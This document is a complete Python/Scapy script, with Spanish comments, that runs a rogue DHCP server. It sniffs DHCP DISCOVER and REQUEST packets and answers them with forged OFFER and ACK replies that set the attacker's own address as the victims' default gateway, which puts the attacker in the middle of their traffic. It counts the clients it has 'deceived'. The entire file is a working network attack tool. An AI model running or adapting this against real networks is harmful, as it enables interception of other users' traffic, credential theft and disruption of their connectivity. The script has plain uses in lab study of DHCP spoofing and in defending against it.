#!/usr/bin/env python3
"""
DHCP Spoofing - Servidor DHCP Falso
Atacante: 192.168.10.11 (Kali - eth0)
Gateway falso que se asigna: 192.168.10.11 (nosotros)
"""

import random, sys, signal, struct
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, sniff, get_if_hwaddr

RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
RESET  = "\033[0m"
BOLD   = "\033[1m"

IFACE      = "eth0"
SERVER_IP  = "192.168.10.11"   # nuestra IP = servidor falso
FAKE_GW    = "192.168.10.11"   # gateway falso = nosotros (MitM)
FAKE_DNS   = "8.8.8.8"
NETMASK    = "255.255.255.0"
POOL_START = "192.168.10.100"  # IPs que asignamos

leases  = {}
pool_idx = 0
served  = 0

def signal_handler(sig, frame):
    print(f"\n{YELLOW}[!] Servidor DHCP falso detenido.{RESET}")
    print(f"{GREEN}[+] Clientes engañados: {served}{RESET}")
    sys.exit(0)

def next_ip():
    global pool_idx
    base = list(map(int, POOL_START.split(".")))
    base[3] += pool_idx
    pool_idx += 1
    return ".".join(map(str, base))

def mac_to_bytes(mac):
    return bytes(int(x, 16) for x in mac.split(":")) + b"\x00" * 10

def handle(pkt):
    global served
    if not pkt.haslayer(DHCP):
        return
    opts = {o[0]: o[1] for o in pkt[DHCP].options if isinstance(o, tuple)}
    mtype = opts.get("message-type", 0)
    cmac  = pkt[Ether].src
    xid   = pkt[BOOTP].xid
    my_mac = get_if_hwaddr(IFACE)

    if mtype == 1:  # DISCOVER → OFFER
        print(f"{CYAN}[*] DISCOVER de {cmac}{RESET}")
        if cmac not in leases:
            leases[cmac] = next_ip()
        offer_ip = leases[cmac]

        pkt_out = (
            Ether(src=my_mac, dst=cmac)
            / IP(src=SERVER_IP, dst="255.255.255.255")
            / UDP(sport=67, dport=68)
            / BOOTP(op=2, yiaddr=offer_ip, siaddr=SERVER_IP,
                    chaddr=mac_to_bytes(cmac), xid=xid)
            / DHCP(options=[
                ("message-type", "offer"),
                ("server_id",    SERVER_IP),
                ("lease_time",   86400),
                ("subnet_mask",  NETMASK),
                ("router",       FAKE_GW),
                ("name_server",  FAKE_DNS),
                "end"
            ])
        )
        sendp(pkt_out, iface=IFACE, verbose=False)
        print(f"{GREEN}[+] OFFER → {cmac} | IP: {offer_ip} | GW FALSO: {FAKE_GW}{RESET}")

    elif mtype == 3:  # REQUEST → ACK
        req_ip = opts.get("requested_addr", leases.get(cmac, next_ip()))
        srv    = opts.get("server_id", "")
        if srv and srv != SERVER_IP:
            return
        leases[cmac] = req_ip
        print(f"{CYAN}[*] REQUEST de {cmac} para {req_ip}{RESET}")

        pkt_out = (
            Ether(src=my_mac, dst=cmac)
            / IP(src=SERVER_IP, dst="255.255.255.255")
            / UDP(sport=67, dport=68)
            / BOOTP(op=2, yiaddr=req_ip, siaddr=SERVER_IP,
                    chaddr=mac_to_bytes(cmac), xid=xid)
            / DHCP(options=[
                ("message-type", "ack"),
                ("server_id",    SERVER_IP),
                ("lease_time",   86400),
                ("subnet_mask",  NETMASK),
                ("router",       FAKE_GW),
                ("name_server",  FAKE_DNS),
                "end"
            ])
        )
        sendp(pkt_out, iface=IFACE, verbose=False)
        served += 1
        print(f"{RED}[✓] ACK → {cmac} | IP: {req_ip} | GW FALSO: {FAKE_GW} ← MitM!{RESET}")

def main():
    signal.signal(signal.SIGINT, signal_handler)
    print(f"""
{RED}{BOLD}
╔══════════════════════════════════════════════════╗
║      DHCP SPOOFING - Servidor DHCP Falso         ║
║  Nuestra IP    : 192.168.10.11                   ║
║  Gateway falso : 192.168.10.11 (nosotros)        ║
║  Pool asignado : 192.168.10.100+                 ║
╚══════════════════════════════════════════════════╝
{RESET}
{YELLOW}[!] Esperando DHCP DISCOVERs... (Ctrl+C para detener){RESET}
""")
    sniff(iface=IFACE, filter="udp and (port 67 or port 68)",
          prn=handle, store=False)

if __name__ == "__main__":
    main()
